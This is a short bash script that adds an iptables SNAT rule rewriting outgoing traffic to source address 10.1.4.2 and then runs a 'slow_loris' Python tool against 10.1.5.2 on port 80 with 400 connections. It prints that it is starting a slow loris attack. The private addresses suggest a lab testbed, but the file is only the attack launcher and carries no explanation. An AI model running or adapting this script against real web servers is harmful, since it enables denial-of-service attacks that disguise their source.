#!/bin/bash

if [[ $# -lt 1 ]]
then
    echo "USAGE: ./slow_loris_wrules <src_IP>"
    exit
fi

sudo iptables -t nat -A POSTROUTING -j SNAT --to-source 10.1.4.2
echo "> NAT rule set. Starting slow_loris attack with srcIP $1"
sudo python3 ./slow_loris 10.1.5.2 80 400 10 $1